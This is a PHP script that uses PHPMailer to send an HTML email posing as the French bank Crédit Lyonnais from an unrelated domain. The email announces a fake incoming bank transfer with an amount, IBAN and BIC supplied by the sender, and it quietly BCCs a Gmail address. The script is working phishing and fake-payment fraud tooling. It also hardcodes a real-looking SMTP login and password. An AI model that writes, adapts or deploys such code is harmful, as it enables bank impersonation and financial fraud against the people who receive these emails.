<?php
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;


require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';


if ($_SERVER["REQUEST_METHOD"] === "POST") {

    $destinataire = htmlspecialchars($_POST['destinataire'] ?? '');
    $email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
    $iban = htmlspecialchars($_POST['iban'] ?? '');
    $bic = htmlspecialchars($_POST['bic'] ?? '');
    $date = htmlspecialchars($_POST['date'] ?? '');
    $montant = htmlspecialchars($_POST['montant'] ?? '');
    $bccEmail = isset($_POST['bcc_email']) ? htmlspecialchars($_POST['bcc_email']) : 'action.cerivc@gmail.com';

    if (!$email) {
        exit("Adresse e-mail invalide.");
    }

    $_SESSION = compact('destinataire', 'email', 'iban', 'bic', 'date', 'montant');

    $mail = new PHPMailer(true);

    try {
        $mail->SMTPDebug = 0;
        $mail->Debugoutput = 'html';

        // Configuration SMTP Infomaniak
        $mail->isSMTP();
        $mail->Host = 'smtp.infomaniak.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'service@monespace-en-ligne.site';
        $mail->Password = 'Tanguyedmond100@';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
        $mail->Port = 465;

        // Expéditeur et destinataire
        $mail->setFrom('service@monespace-en-ligne.site', 'Service Credit Lyonnais');
        $mail->addAddress($email, $destinataire);

        if (!empty($bccEmail)) {
            $mail->addBCC($bccEmail);
        }

        // Message HTML
        $mail->isHTML(true);
        $mail->Subject = 'Notification de transaction bancaire ';

        $mail->Body = "
            <table>
                <tr><td><img src='https://claudex.ca/secure/Le-credit-lyonnais/assets/img/logo-big.png' alt='bdf' width='60%'></td></tr>
            </table>
            <p>Bonjour $destinataire,</p>
            <p>Nous vous informons que vous avez recu une notification de virement de <strong>$montant EUR</strong> en votre faveur, emis par <strong>BEATRICE</strong>.</p>
            <h4>Details de la transaction :</h4>
            <hr>
            <b>RIB :</b> $iban<br>
            <b>BIC / SWIFT :</b> $bic<br>
            <b>Date du virement :</b> $date<br>
            <b>Montant credite :</b> $montant EUR<br>
            <hr>
            <p>Le montant sera credite sur votre compte sous 72h ouvrees sous reserve de validation.</p>
            <p>Monsieur BEATRICE GOYA, rendez-vous en agence pour une validation en présentiel vu le contentieux sur votre compte.</p>
            <p>Cordialement,<br>Service Credit Lyonnais</p>
        ";

        $mail->AltBody = "Bonjour $destinataire,\n\n"
                       . "Nous vous confirmons la réception d’un virement de $montant EUR émis par BEATRICE GOYA.\n\n"
                       . "Détails de la transaction :\n"
                       . "RIB : $iban\n"
                       . "BIC / SWIFT : $bic\n"
                       . "Date d'initiation : $date\n"
                       . "Montant : $montant EUR\n\n"
                       . "Le montant sera crédité sur votre compte sous 48h ouvrées sous réserve de validation.\n\n"
					   . "Madame BEATRICE GOYA, rendez-vous en agence pour une validation en présentiel vu le contentieux sur votre compte.\n\n"
                       . "Cordialement, L'équipe Credit Lyonnais";

        $mail->send();

        header('Location: essai.php');
        exit();

    } catch (Exception $e) {
        error_log("Échec PHPMailer : {$mail->ErrorInfo}", 3, __DIR__ . '/mail_errors.log');
        echo "Échec de l'envoi de l'e-mail. Erreur: {$mail->ErrorInfo}";
    }
}
?>
